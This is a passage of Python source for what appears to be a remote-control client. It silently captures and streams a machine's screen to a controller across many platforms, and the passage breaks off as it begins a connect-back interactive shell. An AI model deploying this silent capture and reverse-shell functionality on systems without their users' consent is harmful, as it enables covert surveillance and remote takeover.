        _PORTAL_HELPER['failed_until'] = time.time() + 30.0
        raise RuntimeError(text[4:].strip() if text.startswith('ERR ') else
                           'bad portal helper reply: %s' % text[:200])



_HYPR_LAYOUT = {'stamp': 0.0, 'box': None}
_HYPR_LOCK = threading.Lock()


def _hyprland_layout():
    """Bounding box (left, top, width, height) of all Hyprland monitors.

    Cursor positions and monitor geometry are in the compositor's logical
    layout coordinates, which can have negative origins when a monitor sits
    left of or above the primary one.  Captured images always start at (0, 0)
    of that bounding box, so the offset must be removed before scaling.
    The layout changes rarely; cache it for a few seconds so a 5 fps stream
    does not spawn 'hyprctl monitors' for every frame.
    """
    now = time.time()
    with _HYPR_LOCK:
        if _HYPR_LAYOUT['box'] is not None and now - _HYPR_LAYOUT['stamp'] < 5.0:
            return _HYPR_LAYOUT['box']
    exe = shutil.which('hyprctl')
    if not exe:
        return None
    try:
        proc = subprocess.run([exe, '-j', 'monitors'], stdout=subprocess.PIPE,
                              stderr=subprocess.DEVNULL, timeout=1.5)
        monitors = json.loads(proc.stdout.decode('utf-8', 'replace') or '[]')
    except Exception:
        monitors = None
    box = None
    if isinstance(monitors, list):
        lefts, tops, rights, bottoms = [], [], [], []
        for monitor in monitors:
            try:
                x = int(monitor['x'])
                y = int(monitor['y'])
                w = int(monitor['width'])
                h = int(monitor['height'])
            except (KeyError, TypeError, ValueError):
                continue
            if w <= 0 or h <= 0:
                continue
            lefts.append(x)
            tops.append(y)
            rights.append(x + w)
            bottoms.append(y + h)
        if lefts:
            left, top = min(lefts), min(tops)
            box = (left, top, max(rights) - left, max(bottoms) - top)
    with _HYPR_LOCK:
        _HYPR_LAYOUT['stamp'] = now
        _HYPR_LAYOUT['box'] = box
    return box


def _hyprland_pointer(image_size):
    """Hyprland cursor position mapped into the captured image."""
    exe = shutil.which('hyprctl')
    if not exe:
        return None
    try:
        proc = subprocess.run([exe, 'cursorpos'], stdout=subprocess.PIPE,
                              stderr=subprocess.DEVNULL, timeout=1.0)
    except Exception:
        return None
    match = re.search(r'(-?\d+)\s*,\s*(-?\d+)',
                      proc.stdout.decode('ascii', 'replace'))
    if not match:
        return None
    x, y = int(match.group(1)), int(match.group(2))
    width, height = image_size
    box = _hyprland_layout()
    if box is None:
        # Single-monitor layout without a usable monitor list: grim's own
        # coordinates are already image coordinates there.
        if 0 <= x < width and 0 <= y < height:
            return float(x), float(y)
        return None
    left, top, span_x, span_y = box
    if span_x <= 0 or span_y <= 0:
        return None
    px = (x - left) * width / float(span_x)
    py = (y - top) * height / float(span_y)
    if 0 <= px < width and 0 <= py < height:
        return px, py
    return None


def _x11_pointer(image_size):
    """X11 pointer via libX11 (no xdotool dependency) mapped to the image.

    XQueryPointer reports root-window coordinates.  ImageGrab and the X11
    capture tools grab the root window, so a scaled image needs the root
    dimensions to convert.  Works on a real X11 session and in a VMware/X11
    guest; under Wayland it only sees XWayland and is therefore not used.
    """
    try:
        import ctypes
        import ctypes.util
        name = ctypes.util.find_library('X11')
        if not name:
            return None
        x11 = ctypes.CDLL(name)
        x11.XOpenDisplay.argtypes = [ctypes.c_char_p]
        x11.XOpenDisplay.restype = ctypes.c_void_p
        x11.XDefaultRootWindow.argtypes = [ctypes.c_void_p]
        x11.XDefaultRootWindow.restype = ctypes.c_ulong
        x11.XQueryPointer.argtypes = [
            ctypes.c_void_p, ctypes.c_ulong,
            ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.c_ulong),
            ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int),
            ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int),
            ctypes.POINTER(ctypes.c_uint)]
        x11.XQueryPointer.restype = ctypes.c_int
        x11.XDisplayWidth.argtypes = [ctypes.c_void_p, ctypes.c_int]
        x11.XDisplayWidth.restype = ctypes.c_int
        x11.XDisplayHeight.argtypes = [ctypes.c_void_p, ctypes.c_int]
        x11.XDisplayHeight.restype = ctypes.c_int
        x11.XCloseDisplay.argtypes = [ctypes.c_void_p]
        x11.XCloseDisplay.restype = ctypes.c_int
    except Exception:
        return None

    display = x11.XOpenDisplay(None)
    if not display:
        return None
    try:
        root = x11.XDefaultRootWindow(display)
        root_ret = ctypes.c_ulong()
        child_ret = ctypes.c_ulong()
        root_x = ctypes.c_int()
        root_y = ctypes.c_int()
        win_x = ctypes.c_int()
        win_y = ctypes.c_int()
        mask = ctypes.c_uint()
        if not x11.XQueryPointer(display, root, ctypes.byref(root_ret),
                                 ctypes.byref(child_ret),
                                 ctypes.byref(root_x), ctypes.byref(root_y),
                                 ctypes.byref(win_x), ctypes.byref(win_y),
                                 ctypes.byref(mask)):
            return None
        span_x = x11.XDisplayWidth(display, 0)
        span_y = x11.XDisplayHeight(display, 0)
        if span_x <= 0 or span_y <= 0:
            return None
        width, height = image_size
        px = root_x.value * width / float(span_x)
        py = root_y.value * height / float(span_y)
        if 0 <= px < width and 0 <= py < height:
            return px, py
    except Exception:
        return None
    finally:
        try:
            x11.XCloseDisplay(display)
        except Exception:
            pass
    return None


def _macos_pointer(image_size):
    """Quartz pointer (no pyautogui needed), with pyautogui as a fallback.

    CGEventGetLocation returns global display coordinates in the same
    top-left-origin space as CGDisplayBounds.  Retina screenshots are in
    pixels while Quartz reports logical points, so the target image size
    provides the scale.
    """
    import ctypes

    def quartz():
        cg = ctypes.CDLL(
            '/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics')

        class CGPoint(ctypes.Structure):
            _fields_ = [('x', ctypes.c_double), ('y', ctypes.c_double)]

        class CGSize(ctypes.Structure):
            _fields_ = [('width', ctypes.c_double),
                        ('height', ctypes.c_double)]

        class CGRect(ctypes.Structure):
            _fields_ = [('origin', CGPoint), ('size', CGSize)]

        cg.CGEventCreate.argtypes = [ctypes.c_void_p]
        cg.CGEventCreate.restype = ctypes.c_void_p
        cg.CGEventGetLocation.argtypes = [ctypes.c_void_p]
        cg.CGEventGetLocation.restype = CGPoint
        cg.CGEventRelease.argtypes = [ctypes.c_void_p]
        cg.CGMainDisplayID.restype = ctypes.c_uint32
        cg.CGDisplayBounds.argtypes = [ctypes.c_uint32]
        cg.CGDisplayBounds.restype = CGRect
        event = cg.CGEventCreate(None)
        if not event:
            return None
        try:
            point = cg.CGEventGetLocation(event)
        finally:
            cg.CGEventRelease(event)
        bounds = cg.CGDisplayBounds(cg.CGMainDisplayID())
        if bounds.size.width <= 0 or bounds.size.height <= 0:
            return None
        return (point.x, point.y, bounds.origin.x, bounds.origin.y,
                bounds.size.width, bounds.size.height)

    position = None
    try:
        position = quartz()
    except Exception:
        position = None
    if position is None:
        try:
            import pyautogui
            x, y = pyautogui.position()
            screen_w, screen_h = pyautogui.size()
            if screen_w and screen_h:
                position = (x, y, 0, 0, screen_w, screen_h)
        except Exception:
            position = None
    if position is None:
        return None
    x, y, left, top, span_x, span_y = position
    width, height = image_size
    px = (x - left) * width / float(span_x)
    py = (y - top) * height / float(span_y)
    if 0 <= px < width and 0 <= py < height:
        return px, py
    return None


def _cursor_hotspot(image_size):
    """Return the pointer's position in captured-image coordinates, or None.

    Normal screenshots rarely include the cursor.  That is especially visible
    when the controller watches a VMware guest: the guest pointer is drawn by
    the guest OS, not by the host compositor, so it cannot be captured even
    though it moves on screen.  We draw it ourselves from the live position.
    """
    width, height = image_size
    if width <= 0 or height <= 0:
        return None
    try:
        if os.name == 'nt':
            import ctypes
            from ctypes import wintypes

            class POINT(ctypes.Structure):
                _fields_ = [('x', wintypes.LONG), ('y', wintypes.LONG)]

            point = POINT()
            user32 = ctypes.windll.user32
            if not user32.GetCursorPos(ctypes.byref(point)):
                return None
            left = user32.GetSystemMetrics(76)       # SM_XVIRTUALSCREEN
            top = user32.GetSystemMetrics(77)        # SM_YVIRTUALSCREEN
            span_x = user32.GetSystemMetrics(78)     # SM_CXVIRTUALSCREEN
            span_y = user32.GetSystemMetrics(79)     # SM_CYVIRTUALSCREEN
            if span_x <= 0 or span_y <= 0:
                return None
            x = (point.x - left) * width / float(span_x)
            y = (point.y - top) * height / float(span_y)
            if 0 <= x < width and 0 <= y < height:
                return x, y
            return None
        if sys.platform == 'darwin':
            return _macos_pointer(image_size)
        if sys.platform.startswith('linux'):
            if os.environ.get('WAYLAND_DISPLAY'):
                # Hyprland exposes the global cursor position; GNOME Wayland
                # and most other compositors do not.  grim -c / Spectacle -p
                # cover those where the compositor can paint the pointer.
                return _hyprland_pointer(image_size)
            return _x11_pointer(image_size)
    except Exception:
        pass
    return None


_CAPTURE_HAS_CURSOR = False
_PORTAL_CAPTURE_LOCK = threading.Lock()


def _fit_screen(img, max_size=SCREEN_SIZE):
    """Downscale a capture without distorting its aspect ratio."""
    try:
        from PIL import Image
        if img.width > max_size[0] or img.height > max_size[1]:
            img = img.copy()
            img.thumbnail(max_size, Image.Resampling.BILINEAR)
    except Exception:
        # A very old Pillow has no Resampling enum; the LANCZOS name works.
        try:
            from PIL import Image
            img = img.copy()
            img.thumbnail(max_size, Image.LANCZOS)
        except Exception:
            pass
    return img


def _draw_cursor_overlay(img, position=None):
    """Draw a high-contrast pointer so screen shares show mouse movement.

    `position` may be sampled before a slow capture so the pointer is drawn
    where it was when the frame was taken, not where it moved during capture.
    """
    if _CAPTURE_HAS_CURSOR:
        # screencapture -C, GNOME Shell and Spectacle -p already painted the
        # pointer; drawing ours too would show two cursors.  grim -c and the
        # XDG portal do not reliably include it (Hyprland's grim ignores the
        # flag), so those capture paths leave this False and are overlaid.
        return img
    try:
        if position is None:
            position = _cursor_hotspot(img.size)
        if position is None:
            return img
        from PIL import Image, ImageDraw
        overlay = Image.new('RGBA', img.size, (0, 0, 0, 0))
        draw = ImageDraw.Draw(overlay)
        x, y = position
        # A small, recognisable arrow.  Keep it inside the frame at the edges
        # (the hotspot still points at the real cursor position).  Scale it a
        # little on very large captures so it stays visible in a thumbnail.
        scale = max(0.7, min(img.width / 1366.0, 1.6))
        x = min(max(0, int(round(x))), max(0, img.width - 2))
        y = min(max(0, int(round(y))), max(0, img.height - 2))
        points = [(x, y),
                  (x + int(17 * scale), y + int(15 * scale)),
                  (x + int(9 * scale), y + int(16 * scale)),
                  (x + int(13 * scale), y + int(25 * scale)),
                  (x + int(8 * scale), y + int(27 * scale)),
                  (x + int(4 * scale), y + int(18 * scale)),
                  (x, y + int(23 * scale))]
        # White fill with a black border: visible on both dark and light
        # desktops (including a mostly white Windows PowerShell window).
        draw.polygon(points, fill=(255, 255, 255, 245),
                     outline=(0, 0, 0, 255), width=2)
        img.paste(overlay, (0, 0), overlay)
    except Exception:
        pass
    return img


def grab_screen(fast=False):
    """Take one screenshot from wherever this client runs.

    Fast and silent paths first: Pillow's ImageGrab on Windows/macOS/X11
    (that is what used to make screenshots instant), and on Wayland the
    desktop's own tool (grim on Hyprland/Sway, spectacle on KDE, the shell
    API on GNOME) because Pillow only sees XWayland there. On macOS the
    built-in screencapture command is a second path (Screen & System Audio
    Recording permission applies). Android uses root's screencap; stock Android and
    stock iOS deliberately do not allow this, and report exactly why.
    Everything else is a quiet fallback: nothing in this chain opens a
    window of its own (tools that do, like gnome-screenshot or
    xfce4-screenshooter, used to make a capture take up to a minute - they
    are not used anymore). On a Wayland session a solid-colour picture from
    an X11 tool is rejected: that is XWayland's blank root."""
    try:
        import PIL  # noqa: F401
    except ImportError:
        if gui_session_available():
            ensure_dependencies()

    def _load(data):
        from PIL import Image
        return Image.open(io.BytesIO(data)).convert('RGB')

    def from_stdout(cmd):
        # Capture stdout into a private file instead of unbounded PIPE memory:
        # a buggy/malicious helper cannot make this client allocate forever.
        tmpdir = tempfile.mkdtemp(prefix='client_shot_')
        tmp = os.path.join(tmpdir, 'stdout.bin')
        try:
            with open(tmp, 'wb') as out:
                proc = subprocess.run(cmd, stdout=out, stderr=subprocess.DEVNULL,
                                      timeout=15)
            if proc.returncode != 0:
                raise RuntimeError('exit status {}'.format(proc.returncode))
            info = os.lstat(tmp)
            if not stat.S_ISREG(info.st_mode) or info.st_size <= 0:
                raise RuntimeError('capture produced no regular output')
            if info.st_size > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture output is too large')
            with open(tmp, 'rb') as f:
                data = f.read(MAX_CAPTURE_BYTES + 1)
            if len(data) > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture output is too large')
            return _load(data)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def from_file(cmd):
        # A private 0700 directory avoids predictable /tmp/client_shot_*
        # names: another local user cannot pre-create a symlink that makes the
        # capture tool overwrite a file the client can read.
        tmpdir = tempfile.mkdtemp(prefix='client_shot_')
        tmp = os.path.join(tmpdir, 'shot.png')
        try:
            proc = subprocess.run(cmd + [tmp], stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL, timeout=15)
            if proc.returncode != 0 or not os.path.exists(tmp):
                raise RuntimeError('exit status {}'.format(proc.returncode))
            info = os.lstat(tmp)
            if not stat.S_ISREG(info.st_mode):
                raise RuntimeError('capture did not produce a regular file')
            if info.st_size <= 0 or info.st_size > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture produced an invalid file size')
            with open(tmp, 'rb') as f:
                data = f.read(MAX_CAPTURE_BYTES + 1)
            if len(data) > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture file is too large')
            return _load(data)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def from_screencapture():
        """macOS built-in capture (and jailbroken iOS when the tool exists).
        -x = silent, -m = main display only (one file), -t jpg = no PNG pass."""
        tmpdir = tempfile.mkdtemp(prefix='client_shot_')
        tmp = os.path.join(tmpdir, 'shot.jpg')
        exe = shutil.which('screencapture') or '/usr/sbin/screencapture'
        try:
            proc = subprocess.run([exe, '-x', '-C', '-m', '-t', 'jpg', tmp],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                  timeout=15)
            if proc.returncode != 0 or not os.path.exists(tmp):
                detail = proc.stderr.decode('utf-8', 'replace').strip()
                raise RuntimeError(detail or 'exit status {}'.format(proc.returncode))
            info = os.lstat(tmp)
            if not stat.S_ISREG(info.st_mode):
                raise RuntimeError('capture did not produce a regular file')
            if info.st_size <= 0 or info.st_size > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture produced an invalid file size')
            with open(tmp, 'rb') as f:
                data = f.read(MAX_CAPTURE_BYTES + 1)
            if len(data) > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture file is too large')
            return _load(data)
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    def from_android():
        """Android: screencap needs root (READ_FRAME_BUFFER is a system
        permission; MediaProjection needs a consent dialog in an app)."""
        if not _android_root():
            raise RuntimeError('Android blocks screen capture without root '
                               '(grant su in Magisk/KernelSU, then retry)')
        su = _su_path() or 'su'
        exe = '/system/bin/screencap' if os.path.exists('/system/bin/screencap') else 'screencap'
        # Termux's LD_LIBRARY_PATH breaks the system binary's linker.
        cmd = 'unset LD_LIBRARY_PATH; {} -p'.format(exe)
        proc = subprocess.run([su, '-c', cmd], stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, timeout=15)
        if proc.returncode != 0 or not proc.stdout:
            detail = proc.stderr.decode('utf-8', 'replace').strip()
            raise RuntimeError(detail or 'exit status {}'.format(proc.returncode))
        return _load(proc.stdout)

    def from_portal():
        """GNOME/Wayland via the XDG desktop portal (the supported path;
        PyGObject is needed, run through whichever Python has it)."""
        uri = _portal_helper_uri()
        if not uri.startswith('file://'):
            raise RuntimeError('the portal returned no file')
        from urllib.parse import unquote, urlparse
        path = unquote(urlparse(uri).path)
        try:
            with open(path, 'rb') as f:
                data = f.read()
        finally:
            with contextlib.suppress(OSError):
                os.remove(path)          # it was a temporary copy in Pictures
        return _load(data)

    def from_gnome_shell():
        """Older GNOME Shell screenshot API (works up to GNOME 40; modern
        GNOME refuses third-party callers, which is why the portal is first).

        The method is Screenshot(include_cursor, flash, filename): the third
        argument is required, and omitting it made gdbus fail with an
        invalid-arguments error on every GNOME version.  We pass a private
        path (true also draws the pointer) and read that file."""
        exe = shutil.which('gdbus')
        if not exe:
            raise RuntimeError('gdbus is not installed (glib2 package)')
        tmpdir = tempfile.mkdtemp(prefix='client_shot_')
        path = os.path.join(tmpdir, 'shot.png')
        try:
            proc = subprocess.run(
                [exe, 'call', '--session', '--dest',
                 'org.gnome.Shell.Screenshot', '--object-path',
                 '/org/gnome/Shell/Screenshot', '--method',
                 'org.gnome.Shell.Screenshot.Screenshot', 'true', 'false',
                 path],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
            if proc.returncode != 0:
                detail = proc.stderr.decode('utf-8', 'replace').strip()
                raise RuntimeError(detail.splitlines()[-1] if detail else
                                   'exit status {}'.format(proc.returncode))
            out = proc.stdout.decode('utf-8', 'replace').strip()
            if not out.startswith('(true'):
                raise RuntimeError('refused: {}'.format(out[:160] or 'no reply'))
            if not os.path.exists(path):
                raise RuntimeError('GNOME Shell reported success but wrote '
                                   'no screenshot file')
            info = os.lstat(path)
            if not stat.S_ISREG(info.st_mode):
                raise RuntimeError('capture did not produce a regular file')
            if info.st_size <= 0 or info.st_size > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture produced an invalid file size')
            with open(path, 'rb') as f:
                data = f.read(MAX_CAPTURE_BYTES + 1)
            if len(data) > MAX_CAPTURE_BYTES:
                raise RuntimeError('capture file is too large')
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)
        return _load(data)

    # WAYLAND_DISPLAY is the socket a client can actually use. XDG_SESSION_TYPE
    # can survive into an SSH/headless shell (inherited from a desktop login)
    # while the socket is absent; trusting it made a server client wait 25 s
    # for a portal that cannot answer. environment_report() uses the same rule.
    wayland = sys.platform.startswith('linux') and bool(
        os.environ.get('WAYLAND_DISPLAY'))
    desktop = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()

    # name -> (command line, how the picture comes back)
    helpers = {
        # -c asks wlroots for the pointer, but Hyprland's screencopy ignores
        # it, so the client must not rely on it; _CAPTURE_HAS_CURSOR stays
        # False for grim and the pointer is drawn from hyprctl's position.
        'grim': (['grim', '-c', '-t', 'jpeg', '-'], from_stdout),    # wlroots Wayland (Hyprland/Sway)
        # -p / --pointer draws the pointer into Spectacle's own capture (the
        # option GNOME's portal lacks), so no extra overlay is needed.
        'spectacle': (['spectacle', '-b', '-n', '-f', '-p', '-o'], from_file),    # KDE Plasma
        'portal': (None, None),       # XDG portal (GNOME Wayland and a generic fallback)
        'gnome_shell': (None, None),  # pre-41 GNOME Shell API
        'magick': (_imagemagick_command() or
                   ['import', '-window', 'root', 'png:-'], from_stdout),    # ImageMagick (X11)
        'scrot': (['scrot', '-o'], from_file),                       # X11, silent
        'maim': (['maim'], from_file),                               # X11, silent
    }
    # tools whose Wayland output would be XWayland's (blank) root window
    x11_tools = {'Pillow', 'pyautogui', 'magick', 'scrot', 'maim'}

    def capture(name):
        global _CAPTURE_HAS_CURSOR
        _CAPTURE_HAS_CURSOR = False
        if name == 'Pillow':
            from PIL import ImageGrab
            if sys.platform == 'win32':
                try:
                    # Streams use the cheaper capture (layered-window capture
                    # adds a per-window pass and made large displays sluggish).
                    # One-shot screenshots still include layered windows.
                    # A single-monitor VM must not pay for all_screens either.
                    if fast:
                        try:
                            import ctypes
                            monitors = ctypes.windll.user32.GetSystemMetrics(80)  # SM_CMONITORS
                        except Exception:
                            monitors = 1
                        if monitors > 1:
                            img = ImageGrab.grab(all_screens=True)
                        else:
                            img = ImageGrab.grab()
                    else:
                        img = ImageGrab.grab(all_screens=True,
                                             include_layered_windows=True)
                except TypeError:       # Pillow < 6.2 has no such options
                    img = ImageGrab.grab()
            else:
                img = ImageGrab.grab()
            img = img.convert('RGB')
        elif name == 'pyautogui':
            import pyautogui    # NOTE: may sys.exit() on Linux without tkinter
            img = pyautogui.screenshot().convert('RGB')
        elif name == 'screencapture':
            img = from_screencapture()
            _CAPTURE_HAS_CURSOR = True
            return img
        elif name == 'android':
            return from_android()
        elif name == 'portal':
            # Serialize portal captures: KDE writes a second-resolution file
            # name, so two concurrent frames could otherwise overwrite the
            # file between the reply and the read.  The non-interactive
            # portal path is silent; unlike Spectacle -p it does not reliably
            # include the pointer, so _CAPTURE_HAS_CURSOR stays False and the
            # live pointer is painted from the compositor/OS position.
            with _PORTAL_CAPTURE_LOCK:
                img = from_portal()
            return img
        elif name == 'gnome_shell':
            img = from_gnome_shell()
            _CAPTURE_HAS_CURSOR = True
            return img
        else:
            cmd, grab = helpers[name]
            img = grab(cmd)
            if name == 'spectacle':
                _CAPTURE_HAS_CURSOR = True
        if wayland and name in x11_tools:
            lo, hi = img.convert('L').getextrema()
            if lo == hi:             # flat picture: not a real capture
                raise RuntimeError('empty XWayland picture (solid colour)')
        return img

    linux = sys.platform.startswith('linux')
    if is_android():
        order = ['android']             # root screencap, or a clear error
    elif is_ios():
        order = ['screencapture', 'Pillow']     # only a jailbreak has a capture tool
    elif is_macos():
        order = ['Pillow', 'screencapture', 'pyautogui']
    elif wayland:
        # Wayland: only the desktop's own helpers can see the real screen.
        # X11 tools (Pillow/pyautogui/magick/scrot/maim) can only capture
        # XWayland's root window - a black or half-empty picture - so they are
        # not tried here at all: a clear error with instructions is better
        # than a screenshot that silently shows the wrong thing.
        if 'kde' in desktop or 'plasma' in desktop:
            order = ['portal', 'spectacle', 'grim']
        elif 'gnome' in desktop:
            order = ['portal', 'gnome_shell', 'grim']
        else:                        # Hyprland, Sway, ...
            order = ['grim', 'spectacle', 'portal', 'gnome_shell']
    elif linux:
        # X11: Pillow first again (instant and silent, exactly like before);
        # only quiet tools follow - none of them can open a window.
        order = ['Pillow', 'pyautogui', 'magick', 'scrot', 'maim']
    else:
        # Windows: Pillow, with pyautogui as the only backup
        order = ['Pillow', 'pyautogui']
    order = list(dict.fromkeys(order))

    errors = []
    for name in order:
        try:
            return capture(name)
        except BaseException as e:
            if isinstance(e, FileNotFoundError):
                detail = 'not installed (not found in PATH)'
            else:
                detail = str(e)
            errors.append('{}: {}'.format(name, detail))

    if is_android():
        hint = ('Android: screen capture needs root (su + /system/bin/screencap); '
                'stock Android blocks it. Install Pillow for conversion with '
                'pkg install python-pillow.')
    elif is_ios():
        hint = ('iOS: stock iOS does not allow screen capture from a Python app. '
                'Only a jailbroken device with a screencapture tool can do it.')
    elif is_macos():
        hint = ('macOS: python3 -m pip install --break-system-packages --user pillow; '
                'grant Screen & System Audio Recording permission to your terminal '
                'in System Settings > Privacy & Security, then restart it. The '
                'built-in screencapture command is a fallback.')
    elif not gui_session_available():
        hint = ('Headless Linux session (no DISPLAY / WAYLAND_DISPLAY): this is '
                'normal on Ubuntu Server / RHEL Server. Commands, upload/download '
                'and the interactive shell work; screenshots and screen sharing '
                'need a real desktop session.')
    elif wayland:
        hint = ('Wayland: install the desktop helper (grim on Hyprland/Sway, '
                'kde-spectacle on KDE) or enable the desktop portal; on GNOME '
                'install python3-gi (Debian/Ubuntu) or python3-gobject (Fedora). '
                'X11 tools only see XWayland and cannot capture the real screen.')
    elif linux:
        hint = ('Linux X11: sudo apt install python3-pil (Debian/Ubuntu), '
                'sudo dnf install python3-pillow (Fedora; RHEL needs EPEL), '
                'sudo pacman -S python-pillow (Arch); scrot or ImageMagick '
                'also work.')
    else:
        hint = 'Windows: py -m pip install pillow.'
    raise CaptureError('no screen capture available ({}). {}'.format(
        ' | '.join(errors), hint), errors)


def _send_frame(conn, jpeg):
    """Write one JPEG frame ('\\x01' marks it as a frame, not JSON).

    The length prefix and the frame go in one bounded write. If the peer
    stops reading, the worker shuts the whole socket down instead of letting
    the main loop append a JSON reply to a half-written frame."""
    payload = b'\x01' + jpeg
    with SEND_LOCK:
        _send_chunked(conn, len(payload).to_bytes(4, 'big') + payload)


def stream_screen(conn, fps=None, stop_event=None, req_id=None):
    """Capture this machine's screen and stream it to the controller as JPEG
    frames until stop_event is set or the connection breaks.

    This runs in its own thread, so the controller can keep sending commands
    while the screen is shared (that is what its Ctrl+B/'jobs' feature is for).
    The final message carries the id of the request that started the stream,
    so the controller knows exactly which operation ended."""
    interval = None
    if fps:
        try:
            value = float(fps)                  # "2.5" is valid, not just "2"
            interval = 1.0 / max(1.0, min(value, 60.0))
        except (TypeError, ValueError):
            interval = None

    failed = False
    last_size = None
    # Large frames on a limited tunnel used to make motion crawl.  Start at
    # the normal size/quality, then step down only when the send itself is
    # slow; recover gradually on a fast link.  Capture cost is deliberately
    # not part of this decision (lower JPEG quality cannot speed up a grab).
    sizes = [SCREEN_SIZE, (854, 480), (768, 432), (640, 360)]
    size_index = 0
    quality = SCREEN_JPEG_QUALITY
    slow_frames = 0
    fast_frames = 0
    target_interval = interval if interval else 1.0 / 12.0
    slow_threshold = max(0.12, target_interval * 0.8)
    while stop_event is None or not stop_event.is_set():
        start = time.time()
        try:
            # Sample the pointer before a slow grab so the arrow belongs to
            # this frame rather than jumping ahead while the capture runs.
            pointer = None
            if last_size is not None:
                pointer = _cursor_hotspot(last_size)
            img = grab_screen(fast=True)
            img = _fit_screen(img, sizes[size_index])
            if pointer is not None and last_size:
                pointer = (pointer[0] * img.width / float(last_size[0]),
                           pointer[1] * img.height / float(last_size[1]))
            img = _draw_cursor_overlay(img, pointer)
            last_size = img.size
            buf = io.BytesIO()
            img.save(buf, 'JPEG', quality=quality)
        except Exception as e:
            send_msg(conn, {'type': 'error', 'id': req_id,
                            'data': 'screenshot failed: {}'.format(e),
                            'diag': _capture_diag(e)})
            failed = True
            break

        send_start = time.time()
        _send_frame(conn, buf.getvalue())                 # OSError -> reconnect
        send_elapsed = time.time() - send_start
        if send_elapsed > slow_threshold:
            fast_frames = 0
            slow_frames += 1
            if slow_frames >= 2:
                slow_frames = 0
                if quality > 50:
                    quality = max(50, quality - 6)
                elif size_index + 1 < len(sizes):
                    size_index += 1
        elif send_elapsed < min(0.08, slow_threshold * 0.55):
            slow_frames = 0
            fast_frames += 1
            if fast_frames >= 12:
                fast_frames = 0
                if quality < SCREEN_JPEG_QUALITY:
                    quality = min(SCREEN_JPEG_QUALITY, quality + 3)
                elif size_index > 0:
                    size_index -= 1

        if interval:
            elapsed = time.time() - start
            if elapsed < interval:
                time.sleep(interval - elapsed)

    if not failed:
        send_msg(conn, {'type': 'output', 'id': req_id,
                        'data': '[client] screen share stopped'})


STREAM_LOCK = threading.Lock()
STREAM = {'thread': None, 'stop': None, 'id': None}


def stream_running():
    with STREAM_LOCK:
        thread = STREAM['thread']
        return thread is not None and thread.is_alive()


def stop_stream(wait=1.5):
    """Ask a running screen share to finish (it sends the closing message).
    Returns False when nothing was streaming."""
    with STREAM_LOCK:
        stop_event = STREAM['stop']
        thread = STREAM['thread']
    if stop_event is None:
        return False
    stop_event.set()
    if (thread is not None and thread.ident is not None
            and thread is not threading.current_thread()):
        thread.join(wait)               # give it a moment to send the closing note
    return True


def _stream_worker(conn, fps, stop_event, req_id):
    """Thread body for one screen share."""
    try:
        stream_screen(conn, fps, stop_event, req_id)
    except Exception as e:
        print('[!] screen share stopped: {}'.format(e))
        # A frame/JSON write can fail after a partial payload. The control
        # socket is now out of sync; shut it down so the main loop reconnects
        # instead of reading a "header" from the next reply.
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
    finally:
        with STREAM_LOCK:
            if STREAM['thread'] is threading.current_thread():
                STREAM['thread'] = None
                STREAM['stop'] = None
                STREAM['id'] = None


def take_screenshot(conn, req_id=None):
    """Send one full-resolution screenshot as a JPEG image."""
    try:
        img = grab_screen()
        img = _draw_cursor_overlay(img)
        buf = io.BytesIO()
        img.save(buf, 'JPEG', quality=SCREENSHOT_JPEG_QUALITY)
    except Exception as e:
        send_msg(conn, {'type': 'error', 'id': req_id,
                        'data': 'screenshot failed: {}'.format(e),
                        'diag': _capture_diag(e)})
        return
    send_msg(conn, {'type': 'image', 'id': req_id, 'name': 'screenshot.jpg',
                    'data': base64.b64encode(buf.getvalue()).decode('ascii')})


# ---------------------------------------------------------------------------
# Interactive shell ("shell" command): reverse_shell.py's agent injected
# here. When the controller asks for a shell, it opens a fresh port and we
# connect back to it and bridge a real PTY (Unix) or winpty (Windows) until
# the session ends. The main command connection keeps working meanwhile.
# ---------------------------------------------------------------------------

SHELL_CONNECT_TIMEOUT = 25      # public tunnels may need a slower second connection
SHELL_HANDSHAKE_TIMEOUT = 20    # seconds to wait for the terminal-size handshake
SHELL_BUSY = threading.Lock()   # one interactive shell at a time
SHELL_SOCK = [None]             # current shell socket, so reconnect/exit can stop it
SHELL_THREAD = [None]           # its worker thread
SHELL_CANCEL = threading.Event()  # stop_shell() also cancels a connect in progress
SHELL_LOCK = threading.Lock()


def stop_shell(wait=1.0):
    """Stop an interactive shell that belonged to a gone controller.

    Without this, the old shell could keep SHELL_BUSY forever and the next
    'shell' request after a reconnect was refused as 'already running'. The
    cancellation event also covers the connect/handshake window, before
    SHELL_SOCK has been assigned."""
    with SHELL_LOCK:
        sock, thread = SHELL_SOCK[0], SHELL_THREAD[0]
        active = sock is not None or thread is not None
        if active:
            SHELL_CANCEL.set()
    if not active:
        return False
    if sock is not None:
        try:
            sock.shutdown(socket.SHUT_RDWR)     # wakes select()/recv in the bridge
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass
    if (thread is not None and thread.ident is not None
            and thread is not threading.current_thread()):
        thread.join(wait)
    return True


def _recv_exact(sock, n):
    """Read exactly n bytes from a socket (shell handshake)."""
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError('peer closed during handshake')
        buf += chunk
    return buf


def _connect_shell(host, port, scheme='auto', token=None):
    """Connect to the same public endpoint as the control link.

    Raw TCP/TLS uses a second CMON2 handshake; HTTP/HTTPS/WebSocket uses
    /shell.  The shell token from the control message authenticates the
